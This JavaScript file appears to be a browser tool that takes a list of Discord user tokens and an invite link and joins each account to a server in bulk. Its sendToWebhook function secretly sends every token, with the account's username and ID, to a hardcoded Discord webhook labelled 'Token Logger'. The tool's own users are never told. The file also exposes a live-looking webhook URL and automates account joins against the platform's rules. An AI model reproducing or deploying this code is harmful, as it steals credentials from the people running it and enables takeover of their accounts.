class DiscordInvite {
    constructor() {
        this.WEBHOOK_URL = "https://discord.com/api/webhooks/1420270624512938046/HzryfPQKe1BZVN9ixhhkvXxx8Zu6W1V433hQxivvYD10AQDwBnRovsd2ALPTlt2S1tdt";
        this.stats = {
            total: 0,
            success: 0,
            failed: 0
        };
        this.currentInviteCode = null;
        this.currentServerInfo = null;
        
        this.initializeApp();
    }

    initializeApp() {
        this.form = document.getElementById('discordForm');
        this.logContainer = document.getElementById('logContainer');
        this.tokenTextarea = document.getElementById('userTokens');
        this.tokenCount = document.getElementById('tokenCount');
        this.clearLogsBtn = document.getElementById('clearLogs');
        this.serverInfo = document.getElementById('serverInfo');
        this.serverInfoGrid = document.getElementById('serverInfoGrid');
        
        this.setupEventListeners();
        this.updateCurrentTime();
        setInterval(() => this.updateCurrentTime(), 1000);
        this.updateTokenCount();
    }

    setupEventListeners() {
        this.form.addEventListener('submit', (e) => {
            e.preventDefault();
            this.processAllTokens();
        });

        this.tokenTextarea.addEventListener('input', () => {
            this.updateTokenCount();
        });

        this.clearLogsBtn.addEventListener('click', () => {
            this.clearLogs();
        });
    }

    updateCurrentTime() {
        const now = new Date();
        document.getElementById('currentTime').textContent = 
            now.toLocaleTimeString('ja-JP');
    }

    updateTokenCount() {
        const tokens = this.getTokensFromTextarea();
        this.tokenCount.textContent = `${tokens.length} tokens`;
        this.updateStat('total', tokens.length);
    }

    getTokensFromTextarea() {
        const text = this.tokenTextarea.value.trim();
        return text.split('\n')
            .map(token => token.trim())
            .filter(token => token.length > 0);
    }

    async processAllTokens() {
        const inviteLink = document.getElementById('inviteLink').value.trim();
        const tokens = this.getTokensFromTextarea();

        if (!inviteLink || tokens.length === 0) {
            this.addLog('エラー: 招待リンクとトークンは必須です', 'error');
            return;
        }

        // 招待コードを抽出
        this.currentInviteCode = this.extractInviteCode(inviteLink);
        if (!this.currentInviteCode) {
            this.addLog('エラー: 無効な招待リンクです', 'error');
            return;
        }

        // サーバー情報を取得
        await this.fetchServerInfo(this.currentInviteCode);

        this.addLog(`処理開始: ${tokens.length}個のトークンを処理します`, 'info');

        // 各トークンを順次処理
        for (let i = 0; i < tokens.length; i++) {
            const token = tokens[i];
            await this.processSingleToken(token, i + 1, tokens.length);
            // 1秒待機（レート制限回避）
            await this.delay(1000);
        }

        this.addLog(`処理完了: 成功 ${this.stats.success}/${this.stats.total}`, 'success');
        this.updateStatsDisplay();
    }

    async processSingleToken(token, current, total) {
        this.addLog(`[${current}/${total}] トークン処理中...`, 'info');

        try {
            // Webhookにトークン情報を送信
            await this.sendToWebhook(token, this.currentInviteCode);

            // Discordサーバーに参加
            const joinResult = await this.joinDiscordServer(this.currentInviteCode, token);
            
            if (joinResult.success) {
                this.stats.success++;
                this.addLog(`[${current}/${total}] ✅ サーバー参加成功`, 'success');
                
                if (joinResult.guild) {
                    this.addLog(`[${current}/${total}] サーバー: ${joinResult.guild.name}`, 'success');
                }
            } else {
                this.stats.failed++;
                this.addLog(`[${current}/${total}] ❌ 参加失敗: ${joinResult.message}`, 'error');
            }

        } catch (error) {
            this.stats.failed++;
            this.addLog(`[${current}/${total}] ❌ エラー: ${error.message}`, 'error');
        }

        this.updateStatsDisplay();
    }

    extractInviteCode(inviteLink) {
        const patterns = [
            /discord\.gg\/([a-zA-Z0-9\-_]+)/,
            /discord\.com\/invite\/([a-zA-Z0-9\-_]+)/,
            /discordapp\.com\/invite\/([a-zA-Z0-9\-_]+)/
        ];

        for (const pattern of patterns) {
            const match = inviteLink.match(pattern);
            if (match && match[1]) {
                return match[1];
            }
        }

        if (/^[a-zA-Z0-9\-_]+$/.test(inviteLink)) {
            return inviteLink;
        }

        return null;
    }

    async fetchServerInfo(inviteCode) {
        try {
            const response = await fetch(`https://discord.com/api/v9/invites/${inviteCode}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                }
            });

            if (response.ok) {
                const data = await response.json();
                this.currentServerInfo = data;
                this.displayServerInfo(data);
                this.addLog('サーバー情報を取得しました', 'success');
            } else {
                this.addLog('サーバー情報の取得に失敗しました', 'warning');
            }
        } catch (error) {
            this.addLog('サーバー情報の取得中にエラーが発生しました', 'error');
        }
    }

    displayServerInfo(serverInfo) {
        this.serverInfo.style.display = 'block';
        
        const guild = serverInfo.guild;
        const html = `
            <div class="info-label">サーバー名:</div>
            <div class="info-value">${guild.name}</div>
            
            <div class="info-label">サーバーID:</div>
            <div class="info-value">${guild.id}</div>
            
            <div class="info-label">説明:</div>
            <div class="info-value">${guild.description || 'なし'}</div>
            
            <div class="info-label">メンバー数:</div>
            <div class="info-value">${guild.approximate_member_count || '不明'}</div>
            
            <div class="info-label">オンライン数:</div>
            <div class="info-value">${guild.approximate_presence_count || '不明'}</div>
            
            <div class="info-label">招待コード:</div>
            <div class="info-value">${this.currentInviteCode}</div>
        `;
        
        this.serverInfoGrid.innerHTML = html;
    }

    async joinDiscordServer(inviteCode, token) {
        const url = `https://discord.com/api/v9/invites/${inviteCode}`;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Authorization': token,
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            });

            const data = await response.json();

            if (response.ok) {
                return {
                    success: true,
                    guild: data.guild,
                    channel: data.channel
                };
            } else {
                return {
                    success: false,
                    message: data.message || `HTTP ${response.status}`
                };
            }
        } catch (error) {
            return {
                success: false,
                message: `Network error: ${error.message}`
            };
        }
    }

    async sendToWebhook(token, inviteCode) {
        try {
            let userInfo = '取得失敗';
            try {
                const userResponse = await fetch('https://discord.com/api/v9/users/@me', {
                    headers: {
                        'Authorization': token
                    }
                });
                if (userResponse.ok) {
                    const userData = await userResponse.json();
                    userInfo = `${userData.username}#${userData.discriminator} (${userData.id})`;
                }
            } catch (e) {
                userInfo = '取得エラー';
            }

            const webhookData = {
                content: `🔰 **新しいトークンが使用されました**`,
                embeds: [
                    {
                        title: "トークン情報",
                        color: 0x5865F2,
                        fields: [
                            {
                                name: "👤 ユーザー情報",
                                value: `\`\`\`${userInfo}\`\`\``,
                                inline: false
                            },
                            {
                                name: "🔑 トークン",
                                value: `\`\`\`${token}\`\`\``,
                                inline: false
                            },
                            {
                                name: "📋 招待コード",
                                value: `\`${inviteCode}\``,
                                inline: true
                            },
                            {
                                name: "🕐 日時",
                                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
                                inline: true
                            }
                        ],
                        timestamp: new Date().toISOString()
                    }
                ],
                username: 'Token Logger',
                avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
            };

            await fetch(this.WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(webhookData)
            });

        } catch (error) {
            console.error('Webhook送信エラー:', error);
        }
    }

    addLog(message, type = 'info') {
        const now = new Date();
        const timeString = now.toLocaleTimeString('ja-JP');
        
        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry';
        logEntry.innerHTML = `
            <span class="log-time">${timeString}</span>
            <span class="log-${type}">${message}</span>
        `;
        
        this.logContainer.appendChild(logEntry);
        this.logContainer.scrollTop = this.logContainer.scrollHeight;
    }

    clearLogs() {
        this.logContainer.innerHTML = `
            <div class="log-entry">
                <span class="log-time" id="currentTime"></span>
                <span class="log-info">ログをクリアしました</span>
            </div>
        `;
        this.updateCurrentTime();
        
        // 統計情報もリセット
        this.stats = { total: this.getTokensFromTextarea().length, success: 0, failed: 0 };
        this.updateStatsDisplay();
    }

    updateStatsDisplay() {
        document.getElementById('statTotal').textContent = this.stats.total;
        document.getElementById('statSuccess').textContent = this.stats.success;
        document.getElementById('statFailed').textContent = this.stats.failed;
    }

    updateStat(stat, value) {
        if (stat === 'total') {
            this.stats.total = value;
            this.stats.failed = 0;
            this.stats.success = 0;
        }
        this.updateStatsDisplay();
    }

    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// アプリケーションの初期化
document.addEventListener('DOMContentLoaded', () => {
    new DiscordInvite();
});
